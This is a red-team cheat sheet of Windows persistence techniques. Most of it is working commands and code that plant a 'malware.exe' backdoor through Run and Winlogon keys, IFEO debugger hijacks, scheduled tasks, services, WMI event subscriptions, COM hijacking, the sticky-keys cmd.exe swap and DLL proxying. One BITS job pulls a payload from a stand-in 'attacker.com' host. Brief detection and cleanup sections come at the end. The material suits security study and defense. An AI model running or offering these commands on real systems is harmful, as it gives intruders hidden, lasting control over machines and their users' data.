# Persistence Techniques

## Overview
Persistence ensures continued access to a compromised system across reboots and user logoffs. Techniques leverage registry keys, scheduled tasks, services, and system mechanisms.

*Source: Based on ired.team red team notes*

---

## Registry-Based Persistence

### Run Keys
Execute on user logon.

```cmd
# Current user
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\malware.exe"

# All users (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\malware.exe"

# RunOnce (single execution)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\malware.exe"
```

### Winlogon Keys
Execute during login process.

```cmd
# Userinit - runs after user profile is loaded
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\System32\userinit.exe,C:\malware.exe"

# Shell - replace explorer
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,C:\malware.exe"
```

### Image File Execution Options (IFEO)
Debugger persistence - hijack legitimate executables.

```cmd
# When notepad.exe runs, execute malware instead
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\malware.exe"
```

### AppInit_DLLs
Load DLL into every GUI process.

```cmd
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\malware.dll"
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1
```

---

## Scheduled Tasks

### Create Persistent Task
```cmd
# At logon
schtasks /create /tn "Updater" /tr "C:\malware.exe" /sc onlogon /ru SYSTEM

# At startup
schtasks /create /tn "Updater" /tr "C:\malware.exe" /sc onstart /ru SYSTEM

# Every 5 minutes
schtasks /create /tn "Updater" /tr "C:\malware.exe" /sc minute /mo 5

# At specific time daily
schtasks /create /tn "Updater" /tr "C:\malware.exe" /sc daily /st 09:00
```

### PowerShell Method
```powershell
$Action = New-ScheduledTaskAction -Execute "C:\malware.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "Updater" -Action $Action -Trigger $Trigger -Principal $Principal
```

### Hidden Task (COM Handler)
```powershell
# Uses COM handler to hide command
$Action = New-ScheduledTaskAction -Execute "C:\Windows\System32\rundll32.exe" -Argument "-sta {CLSID}"
```

---

## Services

### Create Malicious Service
```cmd
# Create service
sc create Backdoor binpath= "C:\malware.exe" start= auto

# Start service
sc start Backdoor

# Query service
sc query Backdoor
```

### PowerShell Method
```powershell
New-Service -Name "Backdoor" -BinaryPathName "C:\malware.exe" -DisplayName "System Service" -StartupType Automatic
Start-Service Backdoor
```

### Service DLL Persistence
```cmd
# Create service that loads DLL
sc create Backdoor binpath= "C:\Windows\System32\svchost.exe -k netsvcs" type= share start= auto

# Add DLL to service group
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Backdoor\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "C:\malware.dll"
```

---

## Startup Folder

```cmd
# Current user
copy malware.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# All users
copy malware.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### LNK Shortcut
```powershell
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Updater.lnk")
$Shortcut.TargetPath = "C:\malware.exe"
$Shortcut.Save()
```

---

## DLL Hijacking

### DLL Search Order Hijacking
Place malicious DLL in application directory.

```
1. Application directory
2. System directory (C:\Windows\System32)
3. 16-bit system directory
4. Windows directory
5. Current directory
6. PATH directories
```

### Phantom DLL Loading
Target DLLs that don't exist but are searched for.

```powershell
# Find missing DLLs with Process Monitor
# Filter: Result = NAME NOT FOUND, Path ends with .dll

# Common targets:
# - wbemcomn.dll (WMI)
# - wow64log.dll (32-bit apps on 64-bit)
# - DSOUND.dll (DirectSound)
```

### DLL Proxying
Forward legitimate calls while executing malicious code.

```cpp
// proxy.def
EXPORTS
    RealFunction1=legitimate.RealFunction1 @1
    RealFunction2=legitimate.RealFunction2 @2

// DllMain executes malicious code
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Execute payload
        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
    }
    return TRUE;
}
```

---

## WMI Persistence

### WMI Event Subscription
```powershell
# Create event filter (trigger)
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "PersistenceFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320"
}

# Create event consumer (action)
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "PersistenceConsumer"
    CommandLineTemplate = "C:\malware.exe"
}

# Bind filter to consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

### Remove WMI Persistence
```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object { $_.Name -eq "PersistenceFilter" } | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -eq "PersistenceConsumer" } | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like "*PersistenceFilter*" } | Remove-WmiObject
```

---

## COM Hijacking

### Registry CLSID Hijacking
```cmd
# Find COM object loaded by target application
# Hijack by creating HKCU entry (takes precedence over HKLM)

reg add "HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32" /ve /t REG_SZ /d "C:\malware.dll"
reg add "HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Both"
```

### Common Hijackable CLSIDs
```
{b5f8350b-0548-48b1-a6ee-88bd00b4a5e2} - Explorer
{BCDE0395-E52F-467C-8E3D-C4579291692E} - MMDeviceEnumerator
```

---

## Accessibility Features

### Sticky Keys (SETHC)
```cmd
# Replace sethc.exe with cmd.exe
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant administrators:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

# Trigger: Press Shift 5 times at login screen
```

### Utilman
```cmd
# Replace utilman.exe (Ease of Access)
takeown /f C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant administrators:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe

# Trigger: Win+U at login screen
```

### Registry Method (IFEO)
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe"
```

---

## Netsh Helper DLL

```cmd
# Register helper DLL
netsh add helper C:\malware.dll

# Executes when netsh runs
```

---

## Print Monitor

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\Backdoor" /v Driver /t REG_SZ /d "malware.dll"

# DLL loads into spoolsv.exe (SYSTEM)
```

---

## Application Shimming

### Create Shim Database
```powershell
# Use Windows Application Compatibility Toolkit
# Create shim that injects DLL or redirects execution

sdbinst malware.sdb
```

---

## BITS Jobs

```powershell
# Create persistent BITS job
bitsadmin /create backdoor
bitsadmin /addfile backdoor http://attacker.com/payload.exe C:\malware.exe
bitsadmin /SetNotifyCmdLine backdoor "C:\malware.exe" ""
bitsadmin /SetMinRetryDelay backdoor 60
bitsadmin /resume backdoor
```

---

## Office Add-ins

### Word STARTUP Folder
```cmd
copy malware.dll "%APPDATA%\Microsoft\Word\STARTUP\"
```

### Excel XLL Add-in
```cmd
reg add "HKCU\Software\Microsoft\Office\16.0\Excel\Options" /v OPEN /t REG_SZ /d "/A \"C:\malware.xll\""
```

---

## PowerShell Profile

```powershell
# User profile
echo "Start-Process C:\malware.exe" >> $PROFILE

# All users profile
echo "Start-Process C:\malware.exe" >> $PSHOME\Profile.ps1
```

---

## Detection & Hunting

### Registry Locations to Monitor
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
HKLM\SYSTEM\CurrentControlSet\Services
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
```

### Tools for Detection
| Tool | Purpose |
|------|---------|
| Autoruns | Comprehensive persistence enumeration |
| Process Monitor | DLL loading analysis |
| Sysmon | Event logging for persistence |
| KAPE | Artifact collection |

---

## Cleanup Commands

```cmd
# Remove scheduled task
schtasks /delete /tn "Backdoor" /f

# Remove service
sc delete Backdoor

# Remove registry key
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /f

# Remove WMI subscription
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Remove-WmiObject
```
